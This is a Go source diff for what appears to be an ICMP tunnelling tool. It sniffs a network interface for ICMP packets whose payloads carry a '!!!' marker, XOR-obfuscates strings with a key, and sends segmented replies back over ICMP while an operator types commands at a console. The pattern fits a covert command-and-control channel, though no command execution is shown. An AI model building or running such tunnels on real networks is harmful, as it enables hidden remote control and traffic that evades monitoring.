@@ -59,23 +59,56 @@ func generate_header(segment int, segmented bool) string {
 	return header
 }
 
-func send_packets(addr string, c icmp.PacketConn) {
-	for _, packet := range PACKETQUEUE {
-		// fmt.Println("Packet:", addr)
-		binaryEncoding, _ := packet.Marshal(nil)
-		dst, _ := net.ResolveIPAddr("ip4", addr)
-		anInt, err := c.WriteTo(binaryEncoding, dst)
+func convert(nums []byte) string {
+	var converted string
+	converted = bytes.NewBuffer(nums).String()
+	return converted
+}
 
-		if err != nil {
-			fmt.Println("I FAILED DOG")
-		} else if anInt != len(binaryEncoding) {
-			fmt.Println("YOU FELL OFF")
+func encrypt_decrypt(plaintext string) string {
+	encrypted := ""
+	for i := range plaintext {
+		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
+	}
+	return encrypted
+}
+
+func sender(dst string) {
+	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
+	if err != nil {
+		fmt.Println(err)
+	}
+	send_packets(dst, *c)
+}
+
+func sniffer() {
+	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handler.Close()
+	if err := handler.SetBPFFilter(filter); err != nil {
+		log.Fatal(err)
+	}
+	source := gopacket.NewPacketSource(handler, handler.LinkType())
+	for packet := range source.Packets() {
+		payload := convert(packet.ApplicationLayer().Payload())
+		header := payload[0:7]
+		if strings.HasPrefix(header, "!!!") {
+			SSM = false
+			execute = false
+			payload = payload[7:]
+			fmt.Println("[PAYLOAD]", payload)
+			generate_packet("done", 0)
+			ipLayer := packet.Layer(layers.LayerTypeIPv4)
+			ip, _ := ipLayer.(*layers.IPv4)
+			sender(ip.DstIP.String())
 		}
 	}
-
 }
 
 func generate_packet(payload string, segment int) {
+	PACKETQUEUE = make([]icmp.Message, (len(payload)/1460)+1)
 	byteSize := len(payload)
 	// Recursivly calls generate packet if too large
 	if byteSize > 1460 {
@@ -112,68 +145,24 @@ func generate_packet(payload string, segment int) {
 	}
 }
 
-func sniffer(c icmp.PacketConn) {
-	handler, err := pcap.OpenLive("ens160", buffer, false, pcap.BlockForever)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer handler.Close()
-	if err := handler.SetBPFFilter(filter); err != nil {
-		log.Fatal(err)
-	}
-	source := gopacket.NewPacketSource(handler, handler.LinkType())
-	for packet := range source.Packets() {
-		payload := convert(packet.ApplicationLayer().Payload())
-		header := payload[0:7]
-		if strings.HasPrefix(header, "!!!") {
-			payload = payload[7:]
-			fmt.Println("Recieved", payload)
-			response := "Got it"
-			PACKETQUEUE = make([]icmp.Message, (len(response)/1460)+1)
-			execute = true
-			generate_packet(response, 0)
-			if DEBUG {
-				fmt.Println("[SENDING]", response)
-			}
+func send_packets(addr string, c icmp.PacketConn) {
+	for _, packet := range PACKETQUEUE {
+		// fmt.Println("Packet:", addr)
+		binaryEncoding, _ := packet.Marshal(nil)
+		dst, _ := net.ResolveIPAddr("ip4", addr)
+		anInt, err := c.WriteTo(binaryEncoding, dst)
 
-			ipLayer := packet.Layer(layers.LayerTypeIPv4)
-			ip, _ := ipLayer.(*layers.IPv4)
-			fmt.Println("[FROM]", ip.DstIP)
-			go sender(string(ip.DstIP))
+		if err != nil {
+			fmt.Println("I FAILED DOG")
+		} else if anInt != len(binaryEncoding) {
+			fmt.Println("YOU FELL OFF")
 		}
 	}
-}
 
-func sender(dst string) {
-	var SendAddr = dst
-	d, err := icmp.ListenPacket("ip4:icmp", SendAddr)
-	if err != nil {
-		fmt.Println(err)
-	}
-	send_packets(dst, *d) // Need server address
-}
-
-func convert(nums []byte) string {
-	var converted string
-	converted = bytes.NewBuffer(nums).String()
-	return converted
-}
-
-func encrypt_decrypt(plaintext string) string {
-	encrypted := ""
-	for i := range plaintext {
-		encrypted += string(rune(int(plaintext[i]) ^ int(KEY)))
-	}
-	return encrypted
 }
 
 func main() {
-	var ListenAddr = "0.0.0.0"
-	c, err := icmp.ListenPacket("ip4:icmp", ListenAddr)
-	if err != nil {
-		fmt.Println(err)
-	}
-	go sniffer(*c)
+	go sniffer()
 
 	consoleReader := bufio.NewReader(os.Stdin)
 	fmt.Print(">> ")
